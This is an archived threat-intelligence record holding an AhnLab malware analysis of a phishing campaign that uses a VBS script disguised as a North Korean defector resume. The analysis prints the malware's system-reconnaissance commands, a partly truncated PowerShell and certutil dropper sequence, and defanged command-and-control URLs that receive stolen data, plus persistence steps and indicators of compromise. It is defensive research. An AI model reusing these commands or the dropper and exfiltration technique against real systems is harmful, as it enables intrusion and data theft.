{
    "id": "12c180e4-05de-445d-9b14-8487e1406e3c",
    "created_at": "2022-10-25T16:48:18.389999Z",
    "updated_at": "2025-03-27T02:06:12.108623Z",
    "deleted_at": null,
    "sha1_hash": "c5d7e2c9666e64d3d2c303b365b38a07e24026a6",
    "title": "APT attack disguised as North Korean defector resume format",
    "authors": "Ahnlab",
    "file_creation_date": "2022-04-01T14:04:24Z",
    "file_modification_date": "2022-04-01T14:04:24Z",
    "file_size": 918121,
    "plain_text": "# APT attack disguised as North Korean defector resume format (VBS script)\n\n**asec.ahnlab.com/ko/33141**\n\nMarch 29, 2022\n\nThe ASEC analysis team recently confirmed that malicious VBS for the purpose of\ninformation leakage is being distributed through phishing emails related to North Korea. It\ncontains the contents of a broadcast related to North Korea, and a compressed file is\nattached. Referring to writing a resume, induce execution of the attached file. A malicious\nVBS script file exists inside the compressed file.\n\nFigure 1. dissemination email\n\n\n-----\n\nFigure 2. attached compressed file\n\nThe brief behavior of the '2022 resume form.vbs' file is as follows.\n\nInformation Collection and Transmission\nGenerating a normal Korean file\nCreating additional malicious script files and registering the task scheduler\n\nWhen the VBS file is executed, information of the user's PC is collected through the following\ncommand.\n\n**Information Collected** **command**\n\n\nList of currently running\nprocesses\n\n\ncmd /c tasklist /v | clip\n\n\nrouting table information cmd /c Route print | clip\n\nAbout Program Files folder cmd /c dir /w “”%SystemRoot%/../Program Files”” |\nclip\n\n\nAbout Program Files (x86)\nfolder\n\n\ncmd /c dir /w “”%SystemRoot%/../Program Files\n(x86)”” | clip\n\nTable 1. Information Collected\n\n\nAfter encoding the collected information in Base64, it is transmitted to\nhxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php.\n\nParameter value: Cache=error&Sand=[User name]&Data=[base64-encoded collection\ninformation]&Em=[base64-encoded user name]\n\n\n-----\n\nAlso, in order to disguise as a normal file, the Korean file created with the 2022.hwp\ncommand is executed in the folder where the '2022 resume form.vbs' file is executed. The\nKorean file contains the contents of the resume format as follows.\n\nFigure 3. Hangul file inside\n\n\n-----\n\nFigure 4. Hangul file properties\n\nAfter that, the data present in the response received from the URL that transmitted the\ninformation is executed using PowerShell. Also, the %appdata%\\mscornet.vbs file created\nthrough the corresponding response is registered in the task scheduler as the Google Update\nSource Link name. In addition to this, copy mscornet.vbs to the startup program folder so\nthat the VBS file can be executed automatically, and then self-delete the '2022 resume\nform.vbs' file.\n\n\n-----\n\nFigure 5. created task scheduler\n\nCurrently, no special response is received from\nhxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php, which sent the\ninformation, but the received response recorded in RAPIT, our automatic analysis system\n(confirmed on 3/26) ) contains additional commands.\n\nIn the response message, use PowerShell to save base64-encoded data in\n%AppData%\\~KB3241.tmp. After that, ~KB3241.tmp is decoded and saved as\n%AppData%\\mscornet.vbs, and then ~KB3241.tmp is deleted.\n```\npowershell -w hidden ECHO OFF echo\nRnVuY3Rpb24gaDJzKGgpDQogIERpbSBhIDogYSA9IFNwbGl0KGgpDQogIERpbSBp >\n\"%AppData%\\~KB3241.tmp\" \necho DQogIEZvciBpID0gMCBUbyBVQm91bmQoYSkNCiAgICAgIGEoaSkgPSBDaHIoIiYi >>\n\"%AppData%\\~KB3241.tmp\" \n<생략>\necho ZSINCmtpbGxQcm9jZXNzICJpZWxvd3V0aWwuZXhlIg== >> \"%AppData%\\~KB3241.tmp\" \ncertutil -f -decode \"%AppData%\\~KB3241.tmp\" \"%AppData%\\mscornet.vbs\" \ndel \"%AppData%\\~KB3241.tmp\"\n\n```\nmscornet.vbs connects to\nhxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/msgbugGlog.php?\nCache=fail&Sand=[PC name] and executes the received response with the Execute\ncommand. Currently, additional commands are not identified in the URL, but various\nmalicious actions can be performed by an attacker.\n\nRecently, malicious codes disguised as North Korea-related contents are being distributed in\nthe form of VBS scripts as well as word documents, so user attention is required.\n\n\n-----\n\nCurrently, AhnLab V3 product diagnoses the file as follows.\n\n**[File Diagnosis]**\nDropper/VBS.Generic\nTrojan/VBS.Agent\n\n**[IOC]**\nab97956fec732676ecfcedf55efadcbc\ne49e41a810730f4bf3d43178e4c84ee5\nhxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php hmsp\n://cmaildowninvoice.webcindario/sqlite/contrig.\n\n**Related IOCs and related detailed analysis information can be checked through**\n**AhnLab's next-generation threat intelligence platform 'AhnLab TIP'**\n**subscription service.**\n\n[Categories: Malware information](https://asec.ahnlab.com/ko/category/malware/)\n\n[Tagged as: VBScript](https://asec.ahnlab.com/ko/tag/vbscript/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/jvno7qknmcxx4i50fhov6jubdliltmsd"
    ],
    "report_names": [
        "Ahnlab-APT-disguised-NorthKorean-defector-resume-VBS-script(03-29-2022)"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1648821864,
    "ts_modification_date": 1648821864,
    "files": {
        "pdf": "https://archive.orkl.eu/c5d7e2c9666e64d3d2c303b365b38a07e24026a6.pdf",
        "text": "https://archive.orkl.eu/c5d7e2c9666e64d3d2c303b365b38a07e24026a6.txt",
        "img": "https://archive.orkl.eu/c5d7e2c9666e64d3d2c303b365b38a07e24026a6.jpg"
    }
}